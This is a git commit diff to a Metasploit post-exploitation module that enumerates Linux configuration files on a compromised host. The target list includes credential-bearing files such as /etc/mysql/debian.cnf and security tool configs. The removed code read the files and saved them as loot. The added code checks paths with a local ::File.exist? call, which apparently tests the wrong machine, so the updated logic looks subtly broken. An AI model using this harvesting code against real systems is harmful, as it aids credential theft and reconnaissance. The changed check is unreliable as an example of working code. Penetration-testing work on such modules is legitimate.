98bd9a7bd09149f524ebbe1501ec916bf99b078d
ohdae <bindshell@live.com>
2012-03-15 22:59:42 -0400

    Enumerate important and interesting configuration files

--- modules/post/linux/gather/enum_configs.rb
+++ modules/post/linux/gather/enum_configs.rb
@@ -20,16 +20,17 @@ class Metasploit3 < Msf::Post
 		super( update_info( info,
 			'Name'          => 'Linux Gather Configurations',
 			'Description'   => %q{
-				This module collects configuration files found on commonly installed
-				applications and services, such as Apache, MySQL, Samba, Sendmail, etc.
-				If a config file is found in its default path, the module will assume
-				that is the file we want.
+				This module tries to find configuration files for commonly installed
+				applications and services. We are looking for web-servers, SQL servers,
+				authentication platforms, security applications and others.
+				We will check the default locations for these configurations.
 			},
 			'License'       => MSF_LICENSE,
 			'Author'        =>
 				[
 					'ohdae <bindshell[at]live.com>',
 				],
+			'Version'       => '$Revision$',
 			'Platform'      => [ 'linux' ],
 			'SessionTypes'  => [ 'shell' ]
 		))
@@ -42,16 +43,9 @@ class Metasploit3 < Msf::Post
 		print_status("Info:")
 		print_status("\t#{distro[:version]}")
 		print_status("\t#{distro[:kernel]}")
-
+		
 		vprint_status("Finding configuration files...")
 		find_configs
-	end
-
-	def save(file, data, ctype="text/plain")
-		ltype = "linux.enum.conf"
-		fname = ::File.basename(file)
-		loot = store_loot(ltype, ctype, session, data, fname)
-		print_status("#{fname} stored in #{loot.to_s}")
 	end
 
 	def get_host
@@ -66,22 +60,27 @@ class Metasploit3 < Msf::Post
 	end
 
 	def find_configs
-		configs =[
-			"/etc/apache2/apache2.conf", "/etc/apache2/ports.conf", "/etc/nginx/nginx.conf",
-			"/etc/snort/snort.conf", "/etc/mysql/my.cnf", "/etc/ufw/ufw.conf",
-			"/etc/ufw/sysctl.conf", "/etc/security.access.conf", "/etc/shells",
-			"/etc/security/sepermit.conf", "/etc/ca-certificates.conf", "/etc/security/access.conf",
-			"/etc/gated.conf", "/etc/rpc", "/etc/psad/psad.conf", "/etc/mysql/debian.cnf",
-			"/etc/chkrootkit.conf", "/etc/logrotate.conf", "/etc/rkhunter.conf",
-			"/etc/samba/smb.conf", "/etc/ldap/ldap.conf", "/etc/openldap/openldap.conf",
-			"/etc/cups/cups.conf", "/etc/opt/lampp/etc/httpd.conf", "/etc/sysctl.conf",
-			"/etc/proxychains.conf", "/etc/cups/snmp.conf", "/etc/mail/sendmail.conf",
-			"/etc/snmp/snmp.conf"
-		]
+		configs =["/etc/snort/snort.conf", "/etc/apache2/apache2.conf", "/etc/apache2/ports.conf", "/etc/nginx/nginx.conf",
+			"/etc/mysql/my.cnf", "/etc/ufw/ufw.conf", "/etc/ufw/sysctl.conf", "/etc/security.access.conf", "/etc/shells",
+			"/etc/security/sepermit.conf", "/etc/ca-certificates.conf", "/etc/security/access.conf", "/etc/gated.conf",
+			"/etc/rpc", "/etc/psad/psad.conf", "/etc/mysql/debian.cnf", "/etc/chkrootkit.conf", "/etc/logrotate.conf",
+			"/etc/rkhunter.conf", "/etc/samba/smb.conf", "/etc/ldap/ldap.conf", "/etc/openldap/openldap.conf", "/etc/cups/cups.conf",
+			"/etc/opt/lampp/etc/httpd.conf", "/etc/sysctl.conf", "/etc/proxychains.conf", "/etc/cups/snmp.conf", "/etc/mail/sendmail.conf",
+			"/etc/snmp/snmp.conf"]
 
 		configs.each do |f|
-			output = read_file("#{f}")
-			save(f,  output) if output !~ /No such file or directory/
+			if ::File.exist?("#{f}") == true
+				print_good("Found: #{f}")
+				output = ("Config: #{f}")
+
+				report_note(
+					:host_name => get_host,
+					:type      => "config files",
+					:data      => output,
+					:update    => :unique_data
+				)
+			end
 		end
+		print_status("Found configurations saved in notes.")
 	end
 end
